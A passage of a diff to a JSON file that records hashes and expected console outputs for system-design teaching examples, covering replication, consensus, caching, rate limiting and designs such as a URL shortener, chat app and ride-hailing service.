+  "out": "mode                     write latency   read on remote replica right after\nEL: ack after local            1 ms        maybe old value (lag ~90 ms)\nEC: ack after all replicas   181 ms        new value ✔\n\nW=1 of N=3 -> write waits   1 ms (the 1st fastest ack)\nW=2 of N=3 -> write waits  60 ms (the 2nd fastest ack)\nW=3 of N=3 -> write waits 180 ms (the 3rd fastest ack)"
+ },
+ "consistency-models": {
+  "h": "274f54ea6d99c183c3eae906a686b3bcedc47310",
+  "out": "eventual      : random replicas -> r1 'Ravi: hello Asha', then r2 '(nothing)'  (went back in time!)\nmonotonic     : r1 'Ravi: hello Asha'  leader 'Ravi: hello Asha'  r1 'Ravi: hello Asha'  \nread-your-own : Asha reads from leader -> 'Asha: how are you?'\ncausal        : on r2 reply visible=true, original visible=true -> OK, cause before effect\nlinearizable  : read from the leader every time -> 'Asha: how are you?' (always latest, slowest)"
+ },
+ "quorum": {
+  "h": "a405c8d3806b392ffc68e9f225cc53feb7c19279",
+  "out": "write x=7 with W=2 (replica 2 missed it): OK\nR=1 asking replica 2 only     : x=5 (v1) from replicas [2]  <- stale (R+W = 3, not > 3)\nR=2 asking replicas 2 then 1  : x=7 (v2) from replicas [2, 1]  <- overlap guarantees latest\nreplica 2 after read repair   : Versioned[version=2, value=x=7]\nreplica 0 down, W=2 write x=9 : OK (2 acks)\nreplicas 0,1 down, W=2 write  : FAIL (only 1 ack): not available\nreplicas 0,1 down, R=2 read   : FAILED (only 1 replicas reachable)"
+ },
+ "time-clocks": {
+  "h": "5eab2661e5579ca2edee29c5f176bc8ee756b485",
+  "out": "P1: [a@1, send m1@2, b@3]\nP2: [recv m1@3, send m2@4]\nP3: [x@1, y@2, recv m2@5]\nsend m1 (2) < recv m1 on P2 (3): causality preserved\nP1 'b'@3 and P3 'x'@1 are concurrent; Lamport order says x<b but can't tell they're concurrent (use vector clocks)\n\nwall clocks: A writes at 1000000, then B overwrites at 999930 -> last-write-wins keeps A's older write!"
+ },
+ "vector-clocks": {
+  "h": "3bf35fc667b6c4f73112befbe488a570436c554c",
+  "out": "start {A=1}  A {A=2} [eggs, milk]  B {A=1, B=1} [bread, milk]\nstart vs A: happened-before\nA vs B   : CONCURRENT (conflict)\nmerge    : [bread, eggs, milk] clock {A=3, B=1}\nresolved vs B: happened-after -> B's version can be discarded"
+ },
+ "consensus": {
+  "h": "8cdb988404a8bf35a38a498b97209d257eeda077",
+  "out": "node 1 runs in term 1: 5 votes -> LEADER\n  SET x=1: 5/5 acks -> COMMITTED\n  SET y=2: 5/5 acks -> COMMITTED\nnode 1 (leader) crashes\nnode 3 runs in term 2: 4 votes -> LEADER\n  SET x=3: 4/5 acks -> COMMITTED\nnodes 4 and 5 crash too (3 of 5 down)\n  SET z=9: 2/5 acks -> not committed (no majority)\nnode 3 log: [SET x=1, SET y=2, SET x=3, SET z=9], committed up to index 3\nold leader 1 comes back in term 1 and steps down on seeing term 2\nnode 1 now: role=follower term=2 log=[SET x=1, SET y=2, SET x=3]"
+ },
+ "leader-election": {
+  "h": "fcca8c7e4e9b160dc91daab05ccda87c1e4e87ac",
+  "out": "t=0 node-A became leader with fencing token 1\nt=15 node-A freezes (GC pause)\nt=20 node-B became leader with fencing token 2\nt=35 node-A wakes up\nnode-A still holds token 1 but the storage has seen token 2 -> its writes get rejected"
+ },
+ "distributed-locks": {
+  "h": "0d388b1662fbf5fdbb33d27f9a8b8dec194924de",
+  "out": "t=0  worker-1 acquire -> token 1\nt=0  worker-2 acquire -> null (held)\nt=40 lock expired, worker-2 acquire -> token 2\n  storage accepts worker-2 token 2: invoice 9 = PAID\n  storage REJECTS worker-1 (token 1 < 2)\nt=41 worker-1 release -> refused: not the owner anymore\nt=42 worker-2 release -> released\nfinal file: [invoice 9 = PAID]"
+ },
+ "gossip": {
+  "h": "3dc377d2976cd73aab8545b67a57e2445aeeec02",
+  "out": "rumour spreading, 1000 nodes, each informed node tells 2 random peers per round\nround  1:    3 informed\nround  2:    9 informed\nround  3:   26 informed\nround  4:   74 informed\nround  5:  205 informed\nround  6:  465 informed\nround  7:  776 informed\nround  8:  957 informed\nround  9:  996 informed\nround 10: 1000 informed\neveryone knows after 10 rounds: spreading time grows like log(n), so 10x more nodes adds only a few rounds\nnode A heartbeat 1042, last change 0 s ago -> alive\nnode B heartbeat 988, last change 1 s ago -> alive\nnode C heartbeat 731, last change 12 s ago -> DEAD"
+ },
+ "merkle-anti-entropy": {
+  "h": "c9b049363a646930011f030b4b36f680f1513ea9",
+  "out": "root hashes: e0bc5bad vs 4f754875 -> differ\ndiffering key ranges [4, 7] found with 9 hash comparisons\nonly 2498 of 10,000 keys need to be compared/streamed"
+ },
+ "crdt": {
+  "h": "9a4e480134f1dd43b86bebee26e31c896d527586",
+  "out": "likes: A sees 3, B sees 1\nafter merging both ways (twice): A=4 B=4\ncart after concurrent remove/add: A=[bread, milk] B=[bread, milk] (add wins, both converge)"
+ },
+ "byzantine": {
+  "h": "a614f77c9792920ee15f889c083f3b2d7c7a71ca",
+  "out": "4 nodes, 1 liar  -> commit\n3 nodes, 1 liar  -> NO DECISION (3 < 3f+1, can't tolerate a Byzantine node)\nliar equivocates -> NO DECISION\ntolerate 1 faulty: crash faults need 3 nodes, Byzantine faults need 4\ntolerate 2 faulty: crash faults need 5 nodes, Byzantine faults need 7\ntolerate 3 faulty: crash faults need 7 nodes, Byzantine faults need 10"
+ },
+ "unique-id": {
+  "h": "b2c07ce9de6127c2797b9cf0c1fff070b6a266de",
+  "out": "269022658560028672  ts=+64140000000ms machine=7 seq=0\n269022658560028673  ts=+64140000000ms machine=7 seq=1\n269022658560032768  ts=+64140000000ms machine=8 seq=0\n269022658564222976  ts=+64140000001ms machine=7 seq=0\nsorted by id == sorted by time: true\n8 threads x 50,000 ids -> 400000 unique\nclock went back 5 ms -> clock moved backwards (wait or refuse)\nUUIDv4 for comparison: 36 chars, random order"
+ },
+ "bloom-filter": {
+  "h": "15ed2aed5fe200eaa2092ab79086cb3edf7f3b86",
+  "out": "m=958,506 bits (117 KB), k=7 hash functions for 100,000 URLs\nfalse negatives: 0 (never)\nfalse positives: 978 of 100,000 unseen URLs = 0.98% (target 1%)\na HashSet<String> of the same URLs would need roughly 9.4 MB"
+ },
+ "hyperloglog": {
+  "h": "68b1ba27fcf350cc81417b3d39029f4ed3bac1c5",
+  "out": "true distinct     1,000   HLL estimate       996   error -0.44%\ntrue distinct   100,000   HLL estimate   100,350   error +0.35%\ntrue distinct 1,000,000   HLL estimate   991,573   error -0.84%\nHLL memory: 16,384 bytes; exact HashSet: tens of MB"
+ },
+ "geohash-quadtree": {
+  "h": "1baf09e6558aaa43489f99946549bd0fe9637f70",
+  "out": "rider geohash5 = tek92 (cell ~4.9 km)\n  cell te7ud -> [d4]\n  cell tek3y -> [d3]\n  cell tek92 -> [d1, d2, d5]  <- rider's cell\n  nearby d1 at 0.07 km\n  nearby d5 at 0.26 km\n  nearby d2 at 1.48 km\nprefix property: Pune tek927r vs nearby tek92m2 vs Mumbai te7u6pw\n(a driver just across a cell edge is missed unless you also search the 8 neighbouring cells)"
+ },
+ "trie-structures": {
+  "h": "3ded10ef738e3e4b3d9d585645576308883e3ebe",
+  "out": "'c' -> [cat, cat videos, car]  (1 node hops)\n'ca' -> [cat, cat videos, car]  (2 node hops)\n'car' -> [car, cart, career]  (3 node hops)\n'cat' -> [cat, cat videos, catalog]  (3 node hops)\n'd' -> [dog]  (1 node hops)\n'x' -> []  (1 node hops)\nafter 'cart' trends: 'ca' -> [cart, cat, cat videos]"
+ },
+ "what-is-sd": {
+  "h": "4366429ff461ca225dc2550653c6456a273f75d2",
+  "out": "\nPeak load 3,500 req/s\n  1 server                       capacity     1,000  overloaded, bottleneck: app servers\n  LB + 4 app servers             capacity     4,000  OK\n  LB + 12 app servers            capacity     5,000  OK\n  + Redis cache                  capacity    12,000  OK\n  + 60 app servers, 2 replicas   capacity    60,000  OK\n\nPeak load 8,000 req/s\n  1 server                       capacity     1,000  overloaded, bottleneck: app servers\n  LB + 4 app servers             capacity     4,000  overloaded, bottleneck: app servers\n  LB + 12 app servers            capacity     5,000  overloaded, bottleneck: database\n  + Redis cache                  capacity    12,000  OK\n  + 60 app servers, 2 replicas   capacity    60,000  OK\n\nPeak load 30,000 req/s\n  1 server                       capacity     1,000  overloaded, bottleneck: app servers\n  LB + 4 app servers             capacity     4,000  overloaded, bottleneck: app servers\n  LB + 12 app servers            capacity     5,000  overloaded, bottleneck: database\n  + Redis cache                  capacity    12,000  overloaded, bottleneck: app servers\n  + 60 app servers, 2 replicas   capacity    60,000  OK"
+ },
+ "client-server": {
+  "h": "6b16b052cb24e530b2675572d989ea941d900b0d",
+  "out": "request 1 -> 200 served by server-A for user=asha\nrequest 2 -> 200 served by server-B for user=asha\nrequest 3 -> 200 served by server-A for user=asha\nrequest 4 -> 200 served by server-B for user=asha\nBoth servers knew the user because the session is in the shared store (stateless servers)."
+ },
+ "url-journey": {
+  "h": "ca4118155e072d3c5e8cf2ec62f95389e615d497",
+  "out": "Visit https://www.example.com/\n  + 30 ms  DNS: ask resolver -> root -> .com -> example.com NS t=30 ms\n  + 40 ms  TCP handshake with 93.184.216.34 (1 RTT)         t=70 ms\n  + 40 ms  TLS 1.3 handshake (1 RTT)                        t=110 ms\n  +120 ms  CDN edge: MISS -> origin server /                t=230 ms\n  +300 ms  parse HTML, fetch CSS/JS/images, render          t=530 ms\n  page ready in 530 ms\n\nVisit https://www.example.com/\n  +  0 ms  DNS: browser cache hit                           t=0 ms\n  + 40 ms  TCP handshake with 93.184.216.34 (1 RTT)         t=40 ms\n  + 40 ms  TLS 1.3 handshake (1 RTT)                        t=80 ms\n  +  5 ms  CDN edge: cache HIT /                            t=85 ms\n  +300 ms  parse HTML, fetch CSS/JS/images, render          t=385 ms\n  page ready in 385 ms"
+ },
+ "latency-throughput": {
+  "h": "8c29a71d8da1e95477fc294ad4520c805d27eb2a",
+  "out": "threads= 1  latency=20 ms  throughput ~   40 req/s  (Little's law predicts 50)\nthreads= 4  latency=20 ms  throughput ~  190 req/s  (Little's law predicts 200)\nthreads=16  latency=20 ms  throughput ~  780 req/s  (Little's law predicts 800)\n\naverage=63 ms  p50=50  p90=66  p99=732  max=1162\nThe average hides the slow tail; alert on p99."
+ },
+ "scalability": {
+  "h": "3d4f8b1ad125ed1d0295c01f74fbcc98fcf145de",
+  "out": "vertical   1 x  8 cores -> serves  2,000 of 20,000 req/s\nvertical   1 x 32 cores -> serves  8,000 of 20,000 req/s\nvertical   1 x 96 cores -> serves 20,000 of 20,000 req/s\n           (no 300-core machine to buy; and if it dies, everything is down)\nhorizontal  2 x 8 cores -> serves  4,000 of 20,000 req/s\nhorizontal  5 x 8 cores -> serves 10,000 of 20,000 req/s\nhorizontal 10 x 8 cores -> serves 20,000 of 20,000 req/s\none of 10 servers fails -> still serves 18,000 req/s"
+ },
+ "availability": {
+  "h": "e48116e6da737436c6c1fd58e5c1de1a630a6800",
+  "out": "99.000% -> 87.6 hours/year\n99.900% -> 8.8 hours/year\n99.990% -> 52.6 minutes/year\n99.999% -> 5.3 minutes/year\n\nseries LB(99.99) x app(99.9) x DB(99.95) = 99.840% -> 14.0 hours/year\nwith 2 app servers and a DB standby          = 99.9899% -> 53.2 minutes/year\n\nSLO 99.9% over 30 days -> error budget 43.2 minutes; a 25-minute outage uses 58% of it"
+ },
+ "reliability-terms": {
+  "h": "c770affe915a1cd025154cbbe6ac646ea7b80e24",
+  "out": "MTBF  1000 h, MTTR  1.0 h -> formula 99.9001%, simulated year 99.8973%\nMTBF  1000 h, MTTR  0.1 h -> formula 99.9900%, simulated year 99.9897%\nMTBF  5000 h, MTTR  1.0 h -> formula 99.9800%, simulated year 99.9886%\n\nCutting repair time 10x helps as much as making failures 10x rarer.\nP(lose all 3 copies in a year, no re-replication) = 1e-06"
+ },
+ "estimation": {
+  "h": "cce25e3a14a7a08c77ce9156c345b7b38511dded",
+  "out": "Photo app estimate\n  uploads/day      = 10.0 million\n  write QPS        = 115.7 /s, peak 347.2 /s\n  read QPS         = 11.6 thousand /s, peak 34.7 thousand /s\n  read:write ratio = 100 : 1  -> read-heavy, cache + CDN\n  storage/day      = 20.0 TB\n  storage 5 years  = 36.5 PB -> object storage\n  egress bandwidth = 2.3 GB/s -> CDN essential"
+ },
+ "latency-numbers": {
+  "h": "1fe850d38678dda4568a3fb0971b63cb144fc4c8",
+  "out": "sequential array read : 5.81 ns per element\nrandom array read     : 32.11 ns per element (6x slower: cache misses)\nwrite 1 MB to file    : 1.832 ms (OS page cache)\nread 1 MB from file   : 0.171 ms\nreference: same-datacenter round trip ~0.5 ms, India<->US ~200 ms"
+ },
+ "perf-vs-scale": {
+  "h": "b5c5e56ea99b3bdb41206f65a5c7808b1c1bc36f",
+  "out": "utilisation  avg latency   (theory M/M/1: 10 ms / (1 - rho))\n    50%         19.9 ms      20.0 ms\n    70%         33.1 ms      33.3 ms\n    80%         48.9 ms      50.0 ms\n    90%         93.8 ms     100.0 ms\n    95%        173.6 ms     200.0 ms\n\nFast for one user (10 ms) is a performance property;\nstaying fast as load grows needs headroom (scale out before ~70-80% busy)."
+ },
+ "cap-intro": {
+  "h": "82235382fb114ebde945bcb1511fb4fd7b7bee3c",
+  "out": "link OK      : Chennai reads 500\npartitioned  : Mumbai wrote 200\n  CP choice  : Chennai reads ERROR: can't confirm latest value (CP)\n  AP choice  : Chennai reads 500 (may be stale, AP)\nhealed       : Chennai reads 200"
+ },
+ "osi-tcpip": {
+  "h": "c7c301a5ae2c99c544645a3de0fc5340a442900a",
+  "out": "L7 application: GET /cart HTTP/1.1|Host: shop.com\nL4 transport  : [TCP src=51544 dst=443 seq=1]GET /cart HTTP/1.1|Host: shop.com\nL3 network    : [IP 10.0.0.7->142.250.1.1 ttl=64][TCP src=51544 dst=443 seq=1]GET /cart HTTP/1.1|Host: shop.com\nL2 link       : [ETH aa:bb->cc:dd][IP 10.0.0.7->142.250.1.1 ttl=64][TCP src=51544 dst=443 seq=1]GET /cart HTTP/1.1|Host: shop.com[CRC]\n\nreceiver unwraps -> GET /cart HTTP/1.1|Host: shop.com\nan L4 load balancer reads only up to [TCP ...]; an L7 one reads 'GET /cart' and can route by path"
+ },
+ "ip-dns": {
+  "h": "99959a9e7d329786de51a229c275a89da1e9777d",
+  "out": "t=0    www.example.com  -> A 93.184.216.34  [queries so far 3]\nt=10   www.example.com  -> A 93.184.216.34  (cache)  [queries so far 3]\nt=20   shop.example.com -> A 93.184.216.34  (cache)  [queries so far 6]\nt=400  www.example.com  -> A 93.184.216.34  [TTL 300 expired, queries 9]\nt=401  nope.example.com -> NXDOMAIN"
+ },
+ "tcp-udp": {
+  "h": "3ceea36ee1d3c8e2c1c8ca5757b45e7f83ceb5c8",
+  "out": "TCP  sent one <- echo:one\nTCP  sent two <- echo:two\nTCP  sent three <- echo:three\nUDP  got  frame-1 (no handshake, no ack)\nUDP  got  frame-2 (no handshake, no ack)\nUDP  got  frame-3 (no handshake, no ack)"
+ },
+ "http": {
+  "h": "d36b5f995d8783466caed690b9e17b907ace3afb",
+  "out": "GET /items          -> 200 {1=pen} ETag=\"v110888\"\nGET /items (cached) -> 304 Not Modified, no body sent\nPUT /items/2 book   -> 201 Created\nPUT /items/2 book   -> 200 OK (PUT is idempotent: same result)\nGET /items/9        -> 404\nDELETE /items/1     -> 204 No Content\nPATCH /items/1      -> 405"
+ },
+ "tls": {
+  "h": "15dfe158c94b2538727e161f9451d62e9da424a0",
+  "out": "1. client verifies server signature (certificate key): true\n2. both sides derived the same secret without sending it: true\n3. on the wire: 37 encrypted bytes (unreadable)\n4. server decrypts: GET /account HTTP/1.1\n5. tampered message rejected: integrity check failed"
+ },
+ "rest": {
+  "h": "83c7ea1fdebd28a35e1d4bf63c224353b66015fc",
+  "out": "POST shoes key=k1 -> 201 /v1/orders/101 Order[id=101, item=shoes, status=PENDING, version=1]\nPOST shoes key=k1 -> 201 /v1/orders/101 Order[id=101, item=shoes, status=PENDING, version=1]\nPOST socks key=k2 -> 201 /v1/orders/102 Order[id=102, item=socks, status=PENDING, version=1]\nPOST cap key=k3 -> 201 /v1/orders/103 Order[id=103, item=cap, status=PENDING, version=1]\nGET page 1 -> 200 {items:[101, 102], next_cursor:102}\nGET page 2 -> 200 {items:[103], next_cursor:null}\nPATCH v1   -> 200 Order[id=101, item=shoes, status=PAID, version=2]\nPATCH v1   -> 412 version changed, re-read first  (stale version)"
+ },
+ "rpc-grpc": {
+  "h": "6958faa53ffcf9e43a3b8a0899206a78be19c567",
+  "out": "  [wire] getOrder request 149 bytes\ngetOrder -> Order{id=987, status=PAID}\n  [wire] total request 175 bytes\ntotal    -> 2897\nThe caller wrote client.getOrder(...) like a local call; the stub hid the network."
+ },
+ "graphql": {
+  "h": "d5152bf9c5981ff8f481a3d5fccf1b585a9214ab",
+  "out": "query { user(id:42) { name } }\n  -> {name=Asha}   db calls: 1\nquery { user(id:42) { name city posts { title likes } } }\n  -> {name=Asha, city=Pune, posts=[{title=Hello, likes=10}, {title=System design, likes=99}]}   db calls: 2\nOne request, exactly the fields asked for: no over-fetching, no second round trip."
+ },
+ "realtime-comm": {
+  "h": "867ef7e663e1ee4a89008269b086a9ad90d65f2b",
+  "out": "short polling: 4 requests -> [msg@120 seen@200 (late 80 ms), msg@450 seen@600 (late 150 ms), msg@460 seen@600 (late 140 ms)]\nlong polling : 3 requests -> [msg@120, msg@450, msg@460] (each delivered as soon as it arrived)\npush (WS/SSE): 1 connection -> [msg@120, msg@450, msg@460]"
+ },
+ "api-gateway": {
+  "h": "c8c74d98ad261dca273a2a44dfa28188de950843",
+  "out": "req-1  /users/me      ip=1.2.3.4  -> 200 user-service: profile of user-42\nreq-2  /orders        ip=1.2.3.4  -> 200 order-service: orders of user-42\nreq-3  /orders        ip=5.6.7.8  -> 401 invalid token\nreq-4  /search        ip=1.2.3.4  -> 404 no route\nreq-5  /orders        ip=1.2.3.4  -> 429 rate limited"
+ },
+ "proxies": {
+  "h": "413013d3bc214ee5df9f028de3ca7e851d21ba5d",
+  "out": "reverse: server-1 /api/cart\nreverse: server-2 /api/cart\nreverse: server-1 /static/logo.png\nreverse: server-1 /static/logo.png [proxy cache]\nforward: news page /today (site saw proxy IP, not 10.0.0.5)\nforward: 403 blocked by company policy"
+ },
+ "rate-limiting": {
+  "h": "6036f13d5887f44a32afdd5df03f6a2149f584ad",
+  "out": "fixed window ✔✔✔✔✔✔✔✔✔✔  allowed 10 of 10 within 140 ms\nsliding log  ✔✔✔✔✔✘✘✘✘✘  allowed 5 of 10 within 140 ms\ntoken bucket ✔✔✔✔✔✘✘✘✘✘  allowed 5 of 10 within 140 ms\nFixed window lets 10 through around the boundary; sliding log and token bucket hold the limit."
+ },
+ "urlshortener-hld": {
+  "h": "57905ed18bfcc9fe730da9dc5e8d02850595f77f",
+  "out": "app-1 -> https://sho.rt/15FTGg\napp-2 -> https://sho.rt/15FTWo  (different id ranges: no coordination per request)\ncustom -> https://sho.rt/diwali\ncustom again -> 409 alias taken\nredirect 15FTGg -> 302 Location: https://en.wikipedia.org/wiki/System_design | db reads so far 1 (rest from cache)\nredirect diwali at t=50  -> 302 Location: https://sale.example.com/diwali\nredirect diwali at t=150 -> 410 Gone (expired)\nredirect nope            -> 404\nclick counts: {15FTGg=6, diwali=1}\n7-char base62 codes give 3,521,614,606,208 possible links"
+ },
+ "pastebin-hld": {
+  "h": "2908d7b755b8d6225d895f96413772caac579cbc",
+  "out": "created llpr, lrtq, lxxp; blobs stored: 2 (duplicate content shared)\nravi reads llpr -> public static void main(String[] args) {}\nravi reads lxxp -> 403\nt=100 read lrtq -> 404 (expired)\ncleanup removed 1 paste(s); blobs left 2\nhuge paste -> 413 too large"
+ },
+ "ratelimiter-hld": {
+  "h": "95ac48845f09d5c2696ef9367b759bc7e1fc1d6c",
+  "out": "t= 100 gw-1 asha(free) -> 200 (est 1.0 of 5)\nt= 200 gw-2 asha(free) -> 200 (est 2.0 of 5)\nt= 300 gw-1 asha(free) -> 200 (est 3.0 of 5)\nt= 400 gw-2 asha(free) -> 200 (est 4.0 of 5)\nt= 500 gw-1 asha(free) -> 200 (est 5.0 of 5)\nt= 600 gw-2 asha(free) -> 429 (est 6.0 > 5) Retry-After: 400 ms\nt=1100 gw-1 asha(free) -> 429 (est 6.4 > 5) Retry-After: 900 ms\nt=1500 gw-2 asha(free) -> 200 (est 5.0 of 5)\npro user ravi, 8 quick requests -> 8 allowed\nredis outage, gw-2 -> 200 (fail-open: limiter unavailable)"
+ },
+ "idgen-hld": {
+  "h": "0073e3b95576ef9b1e4d141cc8d4a6e8cba39515",
+  "out": "Snowflake ids from 3 machines in the same millisecond:\n  machine 1 -> 269022658560004096, 269022658560004097\n  machine 2 -> 269022658560008192, 269022658560008193\n  machine 3 -> 269022658560012288, 269022658560012289\n  300,000 ids generated in parallel -> unique: 300000\nTicket server ranges: app-1 [1, 1000], app-2 [1001, 2000] (one DB call per 1,000 ids)\nUUIDv7-style: 019abef02300-7bb1-99b89cd868fb0e6f < 019abef02305-7684-b52cccfc0946b8f0 ? true (time-sortable, no coordination, 128 bits)"
+ },
+ "kvstore-hld": {
+  "h": "8105c7f7edef74c3509799168b228d321a126977",
+  "out": "preference list for 'cart:42': [D, A, C]\nput cart:42=[shoes] v1 -> OK (3 acks)\nA goes down; put cart:42=[shoes,socks] v2 -> OK (3 acks) (hint stored on a spare node)\nhinted handoff: B -> A\n    read repair: D updated\nget cart:42 -> [shoes,socks] (v2) from [D, A]"
+ },
+ "cache-hld": {
+  "h": "a616c58cc5ee20c80b952f34060a59372572dfc5",
+  "out": "cache-1 keys=400 hits=9305 misses=4733\ncache-2 keys=400 hits=6927 misses=953\ncache-3 keys=276 hits=7806 misses=276\ndb reads: 5962 of 30,000\ncache-2 dies: its keys move to the next nodes on the ring; extra db reads in next 3,000 requests: 1104\nhot key product:0 now served from each app server's local cache (no network hop)"
+ },
+ "crawler-hld": {
+  "h": "e05c0128a39c7d746f2215118b2e0cc39b82bbf3",
+  "out": "t=   0 GET  https://a.com/         depth 0\n        skip https://a.com/private (robots.txt)\nt=1000 GET  https://a.com/x        depth 1\nt=1000 GET  https://b.com/         depth 1  (duplicate content, not indexed)\nt=1000 GET  https://c.com/         depth 2\nt=2000 GET  https://b.com/copy     depth 2  (duplicate content, not indexed)\ncrawled 5 unique URLs, 3 unique pages indexed"
+ },
+ "notification-hld": {
+  "h": "ee1acbfdfcc7516b5cff71aa6144eb81556fc0f5",
+  "out": "202 queued\n202 queued\nskipped\nduplicate ignored\n202 queued\n[push] to asha: 'Hi Asha, order 987 has shipped' -> FCM/APNs\n[push] to zoya: 'Hi Zoya, order 990 has shipped' -> FCM/APNs\n    twilio attempt 1 failed\n    twilio attempt 2 failed\n[sms] to asha: 'Your OTP is 482913' -> msg91 (attempt 1)\nstatus: {n1=SENT via FCM/APNs, n2=SENT via msg91 (attempt 1), n3=SKIPPED (opted out), n4=SENT via FCM/APNs}"
+ },
+ "newsfeed-hld": {
+  "h": "2f5e0fc4da96f0e7cc7867fc4b7e8bd990d9ee71",
+  "out": "asha's ranked feed at hour 24: [bollywood#3(5.25), zoya#2(1.45), ravi#4(1.20), ravi#1(0.98), zoya#5(0.47)]\npushed entries in asha's cache: [5, 4, 2, 1] (bollywood posts pulled at read time)"
+ },
+ "twitter-hld": {
+  "h": "0946fddb5c38b3653502ced7e3371fa45bb1d0db",
+  "out": "asha's home timeline (capped at 3): [zoya: Lunch, ravi: New blog on #SystemDesign and #Kafka, zoya: Learning #SystemDesign]\nsearch #systemdesign -> tweet ids [3, 5]\ntrending last 10 min at minute 10: [#indvaus=4, #systemdesign=2, #kafka=1]\ntrending last 3 min at minute 10 : [#indvaus=2, #kafka=1, #systemdesign=1]"
+ },
+ "instagram-hld": {
+  "h": "0461a3661aaaedcf091b2c912ff0c8c66349f9af",
+  "out": "before worker: [1=PENDING, 2=PENDING, 3=PENDING]\nafter worker : [1=READY, 2=READY, 3=PENDING] (photo 3 never uploaded: cleanup job deletes it later)\nlikes after buffered flush: {1=9000, 2=1000} (1 DB write per photo per flush, not 10,000)\nasha's profile grid (newest first, 150px thumbs via CDN): [thumb/2_150.jpg, thumb/1_150.jpg]"
+ },
+ "chat-hld": {
+  "h": "086dc66e0c1740604368e46281c3cb5eba60a770",
+  "out": "asha -> dm:asha:ravi #1 'Are you coming?' ✓ (stored)\nasha -> group:trip #1 'Goa in December?' ✓ (stored)\n    deliver to zoya via gw-3 ✓✓\nzoya -> group:trip #2 'Yes!!' ✓ (stored)\n    deliver to asha via gw-1 ✓✓\noffline push notifications: {kiran=[group:trip#1, group:trip#2], ravi=[dm:asha:ravi#1, group:trip#1, group:trip#2]}\nravi connects to gw-2, syncs dm:asha:ravi after #0 -> [1:Are you coming?]\nravi connects to gw-2, syncs group:trip after #0 -> [1:Goa in December?, 2:Yes!!]\nravi read group:trip up to #2 (blue ticks sent to sender)\nravi -> group:trip #3 'Count me in' ✓ (stored)\n    deliver to asha via gw-1 ✓✓\n    deliver to zoya via gw-3 ✓✓"
+ },
+ "autocomplete-hld": {
+  "h": "41fb8ac93c9aa543735f111b12866e5a1113a41b",
+  "out": "weekly aggregation: {ikea=1, india vs australia=1, iphone 16=3, iphone 16 pro=1, ipl schedule=1, ipl score=4}\n'i' -> [ipl score, iphone 16, ikea]\n'ip' -> [ipl score, iphone 16, iphone 16 pro]\n'iph' -> [iphone 16, iphone 16 pro]\n'IPL ' -> [ipl score, ipl schedule]\n'x' -> []\ntrie lookups: 5 (repeats served from the prefix cache / CDN)\nafter the hourly rebuild, 'iph' -> [iphone 17 launch, iphone 16, iphone 16 pro]"
+ },
+ "youtube-hld": {
+  "h": "527412a4c5723a7c45b12ff00ec57b3ddb32314e",
+  "out": "transcoded 10 chunks x 4 renditions = 40 tasks on 4 workers in ~110 ms (sequential would be ~200 ms)\nmaster playlist (served from CDN):\n#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=400000\n240p/index.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=1400000\n480p/index.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=2800000\n720p/index.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=5000000\n1080p/index.m3u8\n720p media playlist has 10 segments: [seg0.ts, seg1.ts, seg2.ts] ...\n100,000 views -> 5 DB writes (buffered counts flushed every 20,000)"
+ },
+ "dropbox-hld": {
+  "h": "30ab7c62bfb460f6fc08f1925c8454128ced90c0",
+  "out": "laptop commits plan.txt v1, uploaded 42 bytes\nlaptop commits plan.txt v2, uploaded 16 bytes (only changed chunks)\nphone (offline, based on v1) commits plan (phone conflict).txt v1\npending notifications: {laptop=[plan (phone conflict).txt v1], phone=[plan.txt v1, plan.txt v2], tablet=[plan.txt v1, plan.txt v2, plan (phone conflict).txt v1]}\ntablet downloads plan.txt v2: 'Day1: arrays. Day2: hashing. Day3: graphs.'\nrestore plan.txt v1: 'Day1: arrays. Day2: strings. Day3: graphs.'"
+ },
+ "proximity-hld": {
+  "h": "54a7769b42c4a778004df75f5ac823f0017614ea",
+  "out": "user cell tek92, searching 9 cells [tek3p, tek3r, tek3x, tek90, tek91, tek92, tek93, tek98, tek99]\ncandidates from index: 4 of 5 businesses\n  Le Plaisir     0.39 km  rating 4.7\n  Vaishali       0.25 km  rating 4.5\n  Goodluck Cafe  0.20 km  rating 4.3"
+ },
+ "uber-hld": {
+  "h": "97b8bc06076678ecf44ad925a1324943023e1a6d",
+  "out": "nearby available drivers: [d1(0.08 km), d2(0.40 km), d3(3.29 km)]\noffer to d1 (15 s timeout) -> no response\noffer to d2 (15 s timeout) -> accepted\ntrip REQUESTED -> ACCEPTED -> ARRIVED -> IN_PROGRESS -> COMPLETED\ncell 18.52,73.84: 9 requests / 1 drivers -> surge x3.0\ncell 18.54,73.88: 0 requests / 1 drivers -> surge x1.0"
+ },
+ "ticketmaster-hld": {
+  "h": "2d201a70dd9d1092bc3612e8c42fd450f72bb9d3",
+  "out": "1,000 users try to hold A1 at once -> holds granted: 1 (to user0)\nuser0 pays at t=300 -> confirmed: true\nasha holds A2 at t=0 -> true; ravi tries A2 at t=100 -> false\nasha never pays; ravi tries A2 at t=700 (hold expired) -> true\nasha tries to pay at t=710 -> false (hold lost)\nwaiting room admits [fan0, fan1] to the seat map; 4 still queued\nseats: {A1=Seat[state=BOOKED, user=user0, holdUntil=0], A2=Seat[state=HELD, user=ravi, holdUntil=1300], A3=Seat[state=FREE, user=null, holdUntil=0]}"
+ },
+ "ecommerce-hld": {
+  "h": "43cceef29304275b5826f60f8fc634ab4a34b9fc",
+  "out": "OK OD1 subtotal 2698 + GST 485 = Rs 3183, payment pay_k1\nFAILED: socks out of stock (released 1 reservation(s))\nFAILED: card declined, inventory released\nOK OD2 subtotal 15999 + GST 2879 = Rs 18878, payment pay_k4\nstock now {shoes=4, socks=0, watch=1}\noutbox events for email/warehouse/analytics: [OrderPlaced{OD1, user=asha, total=3183}, OrderPlaced{OD2, user=zoya, total=18878}]"
+ },
+ "payment-hld": {
+  "h": "b4be770e39537fef79aa508b705704a4637e66af",
